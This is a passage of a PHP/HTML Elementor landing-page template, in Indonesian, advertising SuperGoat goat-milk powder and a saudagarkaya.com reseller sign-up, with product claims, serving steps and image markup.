                                                                            Mau dapat penghasilan tambahan jutaan rupiah per bulan ? <br> Daftar Reseller saudagarkaya.com aja
                                                                            </h2>


                                                        <div class="elementor-element elementor-element-dbea815 elementor-column elementor-col-33 elementor-inner-column" data-id="dbea815" data-element_type="column">
                                                            <div class="elementor-column-wrap">
                                                                <div class="elementor-widget-wrap"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <br>
                                            <section class="elementor-element elementor-element-c4cef3d elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="c4cef3d" data-element_type="section" style='background-color:#ffaf00'>
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-f8c3650 elementor-column elementor-col-33 elementor-inner-column" data-id="f8c3650" data-element_type="column">
                                                            <div class="elementor-column-wrap">
                                                                <div class="elementor-widget-wrap"></div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-91bfed5 elementor-column elementor-col-33 elementor-inner-column" style='margin-top:15px;'  data-id="91bfed5" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-885891c elementor-widget elementor-widget-text-editor" data-id="885891c" data-element_type="widget" data-widget_type="text-editor.default">
                                                                        <div class="elementor-widget-container" style="background-color:green;">
                                                                            <div class="elementor-text-editor elementor-clearfix">
                                                                                <p></p>

                                                                                <p><span style="color: #ffffff;"><a href="http://saudagarkaya.com/reseller/<?= $username; ?>" >DAFTAR RESELLER</a></span></p>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>

                                                        <div class="elementor-element elementor-element-dbea815 elementor-column elementor-col-33 elementor-inner-column" data-id="dbea815" data-element_type="column">
                                                            <div class="elementor-column-wrap">
                                                                <div class="elementor-widget-wrap"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>

                                            <div class="elementor-element elementor-element-0f96f33 elementor-widget elementor-widget-spacer" data-id="0f96f33" data-element_type="widget" data-widget_type="spacer.default">
                                                <div class="elementor-widget-container">
                                                    <div class="elementor-spacer">
                                                        <div class="elementor-spacer-inner"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="elementor-element elementor-element-11c85fcf elementor-section-height-min-height elementor-section-items-stretch elementor-section-boxed elementor-section-height-default elementor-section elementor-top-section" data-id="11c85fcf" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
                        <div class="elementor-background-overlay"></div>
                        <div class="elementor-container elementor-column-gap-no">
                            <div class="elementor-row">
                                <div class="elementor-element elementor-element-3402e01c elementor-column elementor-col-100 elementor-top-column" data-id="3402e01c" data-element_type="column">
                                    <div class="elementor-column-wrap  elementor-element-populated">
                                        <div class="elementor-widget-wrap">
                                            <section class="elementor-element elementor-element-7e4b89a elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="7e4b89a" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-1cd96cb elementor-column elementor-col-33 elementor-inner-column" data-id="1cd96cb" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-4304520 elementor-widget elementor-widget-image" data-id="4304520" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="617" height="1024" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/3-8-617x1024-617x1024.png" class="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/3-8-617x1024-617x1024.png" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-38e2f46 elementor-column elementor-col-33 elementor-inner-column" data-id="38e2f46" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-eafe8f3 elementor-widget elementor-widget-image" data-id="eafe8f3" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="1024" height="335" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/bpom-supergoat-1024x335-1024x335.png" class="attachment-large size-large" alt=""  /></div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="elementor-element elementor-element-18e44d9 elementor-widget elementor-widget-heading" data-id="18e44d9" data-element_type="widget" data-widget_type="heading.default">
                                                                        <div class="elementor-widget-container">
                                                                            <p class="elementor-heading-title elementor-size-default">Produk SuperGoat sudah lolos uji BPOM (Badan Pengawas Obat dan Makanan). Jadi kandungan produk 100% sesuai. dengan label komposisi.</p>
                                                                        </div>
                                                                    </div>
                                                                    <div class="elementor-element elementor-element-6b9ee73 elementor-widget elementor-widget-spacer" data-id="6b9ee73" data-element_type="widget" data-widget_type="spacer.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-spacer">
                                                                                <div class="elementor-spacer-inner"></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="elementor-element elementor-element-1f2f8cd elementor-widget elementor-widget-image" data-id="1f2f8cd" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="1024" height="301" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/etta-indonesia-supergoat-1024x301-1024x301.png" class="attachment-large size-large" alt=""  /></div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="elementor-element elementor-element-5c600e5 elementor-widget elementor-widget-heading" data-id="5c600e5" data-element_type="widget" data-widget_type="heading.default">
                                                                        <div class="elementor-widget-container">
                                                                            <p class="elementor-heading-title elementor-size-default">Dibuat oleh Etta Indonesia yang berpengalaman lebih dari 10 tahun dalam mengolah produk susu kambing berkualitas.</p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-f4c0f30 elementor-column elementor-col-33 elementor-inner-column" data-id="f4c0f30" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-4f0cec2 elementor-widget elementor-widget-image" data-id="4f0cec2" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="1024" height="328" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/supergoat-bahan-alami-1024x328-1024x328.png" class="attachment-large size-large"  /></div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="elementor-element elementor-element-17758b5 elementor-widget elementor-widget-heading" data-id="17758b5" data-element_type="widget" data-widget_type="heading.default">
                                                                        <div class="elementor-widget-container">
                                                                            <p class="elementor-heading-title elementor-size-default">100% menggunakan bahan alami tanpa pewarna, perasa atau pemanis buatan, sehingga tidak akan ketergantungan atau menimbulkan efek samping jika berhenti mengkonsumsi.</p>
                                                                        </div>
                                                                    </div>
                                                                    <div class="elementor-element elementor-element-54a8881 elementor-widget elementor-widget-spacer" data-id="54a8881" data-element_type="widget" data-widget_type="spacer.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-spacer">
                                                                                <div class="elementor-spacer-inner"></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="elementor-element elementor-element-983657b elementor-widget elementor-widget-image" data-id="983657b" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="1024" height="325" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/supergoat-halal-1024x325-1024x325.png" class="attachment-large size-large" /></div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="elementor-element elementor-element-9ad7b4a elementor-widget elementor-widget-heading" data-id="9ad7b4a" data-element_type="widget" data-widget_type="heading.default">
                                                                        <div class="elementor-widget-container">
                                                                            <p class="elementor-heading-title elementor-size-default">SuperGoat sudah mendapatkan sertifikat halal Majelis Ulama Indonesia. Jadi terjamin aman untuk dikonsumsi.</p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="elementor-element elementor-element-25bdf273 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-id="25bdf273" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
                        <div class="elementor-background-overlay"></div>
                        <div class="elementor-container elementor-column-gap-no">
                            <div class="elementor-row">
                                <div class="elementor-element elementor-element-6e529b47 elementor-column elementor-col-100 elementor-top-column" data-id="6e529b47" data-element_type="column">
                                    <div class="elementor-column-wrap  elementor-element-populated">
                                        <div class="elementor-background-overlay"></div>
                                        <div class="elementor-widget-wrap">
                                            <div class="elementor-element elementor-element-f213a97 elementor-widget elementor-widget-heading" data-id="f213a97" data-element_type="widget" data-widget_type="heading.default">
                                                <div class="elementor-widget-container">
                                                    <p class="elementor-heading-title elementor-size-default">CARA PENYAJIAN</p>
                                                </div>
                                            </div>
                                            <div class="elementor-element elementor-element-5af3d8e1 elementor-widget elementor-widget-image" data-id="5af3d8e1" data-element_type="widget" data-widget_type="image.default">
                                                <div class="elementor-widget-container">
                                                    <div class="elementor-image"> <img width="960" height="290" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/REVISI-CARA-PENYAJIAN.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/REVISI-CARA-PENYAJIAN.png 960w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/REVISI-CARA-PENYAJIAN-300x91.png 300w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/REVISI-CARA-PENYAJIAN-768x232.png 768w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/REVISI-CARA-PENYAJIAN-860x260.png 860w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/REVISI-CARA-PENYAJIAN-600x181.png 600w" sizes="(max-width: 960px) 100vw, 960px" /></div>
                                                </div>
                                            </div>
                                            <section class="elementor-element elementor-element-cc63cb5 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="cc63cb5" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-d9d299c elementor-column elementor-col-33 elementor-inner-column" data-id="d9d299c" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-9ba5596 elementor-widget elementor-widget-heading" data-id="9ba5596" data-element_type="widget" data-widget_type="heading.default">
                                                                        <div class="elementor-widget-container">
                                                                            <p class="elementor-heading-title elementor-size-default">Larutkan 1 sachet SuperGoat kedalam 150cc air hangat sesuai selera.</p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-4ac5723 elementor-column elementor-col-33 elementor-inner-column" data-id="4ac5723" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-8ff220e elementor-widget elementor-widget-heading" data-id="8ff220e" data-element_type="widget" data-widget_type="heading.default">
                                                                        <div class="elementor-widget-container">
                                                                            <p class="elementor-heading-title elementor-size-default">Aduk hingga larut merata.</p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-d5c626c elementor-column elementor-col-33 elementor-inner-column" data-id="d5c626c" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-e478f0e elementor-widget elementor-widget-heading" data-id="e478f0e" data-element_type="widget" data-widget_type="heading.default">
                                                                        <div class="elementor-widget-container">
                                                                            <p class="elementor-heading-title elementor-size-default">Susu kambing etawa SuperGoat siap dihidangkan. Dan jangan lupa membaca bismillah.</p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="elementor-element elementor-element-0301625 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-id="0301625" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
                        <div class="elementor-background-overlay"></div>
                        <div class="elementor-container elementor-column-gap-no">
                            <div class="elementor-row">
                                <div class="elementor-element elementor-element-a1b2660 elementor-column elementor-col-100 elementor-top-column" data-id="a1b2660" data-element_type="column">
                                    <div class="elementor-column-wrap  elementor-element-populated">
                                        <div class="elementor-background-overlay"></div>
                                        <div class="elementor-widget-wrap">
                                            <section class="elementor-element elementor-element-49568bb elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="49568bb" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-d332b95 elementor-column elementor-col-50 elementor-inner-column" data-id="d332b95" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-9af68b9 elementor-widget elementor-widget-image" data-id="9af68b9" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="528" height="522" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/SARAN-KONSUMSI-SUPERGOAT2.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/SARAN-KONSUMSI-SUPERGOAT2.png 528w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/SARAN-KONSUMSI-SUPERGOAT2-300x297.png 300w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/SARAN-KONSUMSI-SUPERGOAT2-100x100.png 100w" sizes="(max-width: 528px) 100vw, 528px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-96377c1 elementor-column elementor-col-50 elementor-inner-column" data-id="96377c1" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-529823d elementor-widget elementor-widget-heading" data-id="529823d" data-element_type="widget" data-widget_type="heading.default">
                                                                        <div class="elementor-widget-container">
                                                                            <p class="elementor-heading-title elementor-size-default">SARAN KONSUMSI</p>
                                                                        </div>
                                                                    </div>
                                                                    <div class="elementor-element elementor-element-bd91f03 elementor-widget elementor-widget-heading" data-id="bd91f03" data-element_type="widget" data-widget_type="heading.default">
                                                                        <div class="elementor-widget-container">
                                                                            <p class="elementor-heading-title elementor-size-default">Minum rutin 2 kali sehari sebelum atau sesudah makan. SuperGoat dapat dikonsumsi sebagai pendamping makanan utama, atau pengganti makanan utama.</p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="elementor-element elementor-element-9227682 elementor-section-height-min-height elementor-section-items-stretch elementor-section-boxed elementor-section-height-default elementor-section elementor-top-section" data-id="9227682" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
                        <div class="elementor-background-overlay"></div>
                        <div class="elementor-container elementor-column-gap-no">
                            <div class="elementor-row">
                                <div class="elementor-element elementor-element-61f52c6 elementor-column elementor-col-100 elementor-top-column" data-id="61f52c6" data-element_type="column">
                                    <div class="elementor-column-wrap  elementor-element-populated">
                                        <div class="elementor-widget-wrap">
                                            <div class="elementor-element elementor-element-955ffe6 elementor-widget elementor-widget-image" data-id="955ffe6" data-element_type="widget" data-widget_type="image.default">
                                                <div class="elementor-widget-container">
                                                    <div class="elementor-image"> <img width="919" height="1024" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/kelebihan-susu-supergoat-1-919x1024-919x1024.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/kelebihan-susu-supergoat-1-919x1024-919x1024.png" /></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="elementor-element elementor-element-1e28e2ef elementor-section-height-min-height elementor-section-items-stretch elementor-section-boxed elementor-section-height-default elementor-section elementor-top-section" data-id="1e28e2ef" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
                        <div class="elementor-container elementor-column-gap-no">
                            <div class="elementor-row">
                                <div class="elementor-element elementor-element-23584904 elementor-column elementor-col-100 elementor-top-column" data-id="23584904" data-element_type="column">
                                    <div class="elementor-column-wrap  elementor-element-populated">
                                        <div class="elementor-widget-wrap">
                                            <div class="elementor-element elementor-element-4e4ba748 elementor-widget elementor-widget-image" data-id="4e4ba748" data-element_type="widget" data-widget_type="image.default">
                                                <div class="elementor-widget-container">
                                                    <div class="elementor-image"> <img width="960" height="100" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/9-1.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/9-1.png 960w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/9-1-300x31.png 300w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/9-1-768x80.png 768w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/9-1-860x90.png 860w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/9-1-600x63.png 600w" sizes="(max-width: 960px) 100vw, 960px" /></div>
                                                </div>
                                            </div>
                                            <section class="elementor-element elementor-element-c317a5d elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="c317a5d" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-6af229e elementor-column elementor-col-50 elementor-inner-column" data-id="6af229e" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-bef6970 elementor-widget elementor-widget-image" data-id="bef6970" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="577" height="917" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/GANTI.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/GANTI.png 577w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/GANTI-189x300.png 189w" sizes="(max-width: 577px) 100vw, 577px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-507553f elementor-column elementor-col-50 elementor-inner-column" data-id="507553f" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-2e660e3 elementor-widget elementor-widget-image" data-id="2e660e3" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="577" height="918" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/5-5.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/5-5.png 577w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/5-5-189x300.png 189w" sizes="(max-width: 577px) 100vw, 577px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-0fc3566 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="0fc3566" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-956ebfd elementor-column elementor-col-50 elementor-inner-column" data-id="956ebfd" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-d3b14c9 elementor-widget elementor-widget-image" data-id="d3b14c9" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="577" height="917" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/3-6.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/3-6.png 577w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/3-6-189x300.png 189w" sizes="(max-width: 577px) 100vw, 577px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-c11afb0 elementor-column elementor-col-50 elementor-inner-column" data-id="c11afb0" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-79925cd elementor-widget elementor-widget-image" data-id="79925cd" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="577" height="917" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/4-8.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/4-8.png 577w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/4-8-189x300.png 189w" sizes="(max-width: 577px) 100vw, 577px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-668dbeb elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="668dbeb" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-7967858 elementor-column elementor-col-50 elementor-inner-column" data-id="7967858" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-7298fed elementor-widget elementor-widget-image" data-id="7298fed" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="577" height="918" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/6-6.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/6-6.png 577w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/6-6-189x300.png 189w" sizes="(max-width: 577px) 100vw, 577px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-9524d13 elementor-column elementor-col-50 elementor-inner-column" data-id="9524d13" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-bc0864b elementor-widget elementor-widget-image" data-id="bc0864b" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="577" height="918" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/7-4.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/7-4.png 577w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/7-4-189x300.png 189w" sizes="(max-width: 577px) 100vw, 577px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-86ced2a elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="86ced2a" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-9c4472f elementor-column elementor-col-50 elementor-inner-column" data-id="9c4472f" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-db99598 elementor-widget elementor-widget-image" data-id="db99598" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="577" height="918" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/8-3.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/8-3.png 577w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/8-3-189x300.png 189w" sizes="(max-width: 577px) 100vw, 577px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-2d1b50d elementor-column elementor-col-50 elementor-inner-column" data-id="2d1b50d" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-28abb3b elementor-widget elementor-widget-image" data-id="28abb3b" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="577" height="918" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/9-3.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/9-3.png 577w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/9-3-189x300.png 189w" sizes="(max-width: 577px) 100vw, 577px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-fff3252 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="fff3252" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-151164e elementor-column elementor-col-50 elementor-inner-column" data-id="151164e" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-85d39ad elementor-widget elementor-widget-image" data-id="85d39ad" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="577" height="917" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/10-1.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/10-1.png 577w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/10-1-189x300.png 189w" sizes="(max-width: 577px) 100vw, 577px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-b9982e5 elementor-column elementor-col-50 elementor-inner-column" data-id="b9982e5" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-5453b8d elementor-widget elementor-widget-image" data-id="5453b8d" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="577" height="918" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/11-2.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/11-2.png 577w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/11-2-189x300.png 189w" sizes="(max-width: 577px) 100vw, 577px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-3a16153 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="3a16153" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-87c610d elementor-column elementor-col-50 elementor-inner-column" data-id="87c610d" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-fde4788 elementor-widget elementor-widget-image" data-id="fde4788" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="577" height="918" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/12-1.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/12-1.png 577w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/12-1-189x300.png 189w" sizes="(max-width: 577px) 100vw, 577px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-b518e39 elementor-column elementor-col-50 elementor-inner-column" data-id="b518e39" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-d1a0a53 elementor-widget elementor-widget-image" data-id="d1a0a53" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
